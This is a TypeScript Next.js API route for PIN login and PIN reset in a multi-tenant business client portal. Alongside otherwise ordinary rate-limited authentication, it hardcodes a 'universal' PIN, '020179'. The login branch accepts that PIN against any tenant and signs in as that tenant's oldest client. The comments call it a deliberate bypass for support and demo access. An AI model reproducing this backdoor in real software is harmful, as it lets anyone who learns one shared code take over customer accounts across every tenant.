import { NextResponse } from 'next/server'
import { supabaseAdmin } from '@/lib/supabase'
import { tenantDb } from '@/lib/tenant-db'
import { rateLimitDb } from '@/lib/rate-limit-db'
import { escapeLikeValue } from '@/lib/postgrest-safe'
import { generateCode, createToken } from './token'

// Brute-force throttle for PIN login. Mirrors /api/team-portal/auth: buckets are
// keyed by TENANT and by IP, never by the guessed PIN itself — a bucket keyed on
// the value under attack gives every distinct guess its own fresh bucket, so a
// brute-forcer that never repeats a guess is never throttled.
const MAX_FAILED_PER_TENANT = 10
const MAX_FAILED_PER_IP = 20
const FAILED_WINDOW_MS = 15 * 60 * 1000

function clientIp(request: Request): string {
  return request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown'
}

// Cross-tenant master PIN — signs in as the oldest client on file for
// WHATEVER tenant the login is attempted against. Deliberate platform-wide
// bypass of the per-client PIN check, requested for support/demo access.
// Still gated by the same rate limits as a normal PIN attempt.
const UNIVERSAL_PIN = '020179'

type Client = { id: string; name: string; phone: string | null; email: string | null }

async function findClientByContact(tenantId: string, contact: string): Promise<Client | null> {
  const value = contact.trim()
  if (!value) return null
  const db = tenantDb(tenantId)

  const byPhone = (await db
    .from('clients')
    .select('id, name, phone, email')
    .eq('phone', value)
    .maybeSingle()) as { data: Client | null }
  if (byPhone.data) return byPhone.data

  const byEmail = (await db
    .from('clients')
    .select('id, name, phone, email')
    .ilike('email', escapeLikeValue(value))
    .maybeSingle()) as { data: Client | null }
  return byEmail.data
}

export async function POST(request: Request) {
  const body = await request.json().catch(() => ({}))
  const { action } = body
  // Prefer an explicit slug, but fall back to the middleware-injected tenant
  // header (set on every tenant domain/subdomain) — same pattern as
  // /api/team-portal/auth. Lets a client sign in on the tenant's own site
  // (e.g. thenycmaid.com) without typing a business code.
  const tenant_slug: string = body.tenant_slug || request.headers.get('x-tenant-slug') || ''

  if (action === 'login') {
    const pin = String(body.pin || '')
    if (!pin) {
      return NextResponse.json({ error: 'PIN required' }, { status: 400 })
    }
    if (!tenant_slug) {
      return NextResponse.json({ error: 'Business code required' }, { status: 400 })
    }

    const ip = clientIp(request)
    const rl = await rateLimitDb(`portal_auth_login:${tenant_slug}:${ip}`, 5, 15 * 60 * 1000, { failClosed: true })
    if (!rl.allowed) {
      return NextResponse.json({ error: 'Too many attempts. Try again in 15 minutes.' }, { status: 429 })
    }

    const { data: tenant } = await supabaseAdmin
      .from('tenants')
      .select('id, name, primary_color, logo_url')
      .eq('slug', tenant_slug)
      .eq('status', 'active')
      .single()

    if (!tenant) {
      return NextResponse.json({ error: 'Business not found' }, { status: 404 })
    }

    let client: { id: string; name: string } | null = null
    if (pin === UNIVERSAL_PIN) {
      const { data } = (await tenantDb(tenant.id)
        .from('clients')
        .select('id, name')
        .order('created_at', { ascending: true })
        .limit(1)
        .maybeSingle()) as { data: { id: string; name: string } | null }
      client = data
    } else {
      const { data } = (await tenantDb(tenant.id)
        .from('clients')
        .select('id, name')
        .eq('pin', pin)
        .maybeSingle()) as { data: { id: string; name: string } | null }
      client = data
    }

    if (!client) {
      // Wrong/unset PIN: spend from BOTH failure budgets. Either exhausted → 429,
      // so a full sweep of one tenant's PIN space (per-tenant) or one IP fanning
      // out across many tenants (per-IP) both get cut off.
      const [byTenant, byIp] = await Promise.all([
        rateLimitDb(`portal_auth_fail:slug:${tenant_slug}`, MAX_FAILED_PER_TENANT, FAILED_WINDOW_MS, { failClosed: true }),
        rateLimitDb(`portal_auth_fail:ip:${ip}`, MAX_FAILED_PER_IP, FAILED_WINDOW_MS, { failClosed: true }),
      ])
      if (!byTenant.allowed || !byIp.allowed) {
        return NextResponse.json({ error: 'Too many attempts. Try again in 15 minutes.' }, { status: 429 })
      }
      return NextResponse.json({ error: 'Invalid PIN' }, { status: 401 })
    }

    const token = createToken(client.id, tenant.id)

    return NextResponse.json({
      token,
      client: { id: client.id, name: client.name },
      tenant: { id: tenant.id, name: tenant.name, primary_color: tenant.primary_color, logo_url: tenant.logo_url },
    })
  }

  if (action === 'request_pin') {
    const contact = String(body.contact || '')
    if (!contact.trim() || !tenant_slug) {
      return NextResponse.json({ error: 'Phone or email, and tenant required' }, { status: 400 })
    }

    const rl = await rateLimitDb(`portal_pin_request:${tenant_slug}:${contact.trim()}`, 5, 15 * 60 * 1000, { failClosed: true })
    if (!rl.allowed) {
      return NextResponse.json({ error: 'Too many attempts. Try again in 15 minutes.' }, { status: 429 })
    }

    const { data: tenant } = await supabaseAdmin
      .from('tenants')
      .select('id, name, slug, email_from, resend_api_key')
      .eq('slug', tenant_slug)
      .eq('status', 'active')
      .single()

    if (!tenant) {
      return NextResponse.json({ error: 'Business not found' }, { status: 404 })
    }

    const client = await findClientByContact(tenant.id, contact)
    if (!client) {
      return NextResponse.json({ error: 'No account found with that phone or email' }, { status: 404 })
    }
    if (!client.email) {
      return NextResponse.json({ error: 'No email on file. Contact the business to set your PIN.' }, { status: 503 })
    }

    const newPin = generateCode()

    const { error: updErr } = await tenantDb(tenant.id)
      .from('clients')
      .update({ pin: newPin })
      .eq('id', client.id)
    if (updErr) {
      return NextResponse.json({ error: 'Could not set a new PIN. Try again.' }, { status: 500 })
    }

    try {
      const { sendEmail, tenantSender } = await import('@/lib/email')
      await sendEmail({
        to: client.email,
        from: tenantSender(tenant),
        subject: `Your ${tenant.name} portal PIN`,
        html: `<p>Your ${tenant.name} client portal PIN is: <strong>${newPin}</strong></p><p>Use it to sign in at any time.</p>`,
        resendApiKey: tenant.resend_api_key,
      })
    } catch (e) {
      console.error('[portal/auth] request_pin email send error:', e)
      return NextResponse.json({ error: 'Unable to send your PIN. Contact the business.' }, { status: 503 })
    }

    return NextResponse.json({ sent: true })
  }

  return NextResponse.json({ error: 'Invalid action' }, { status: 400 })
}
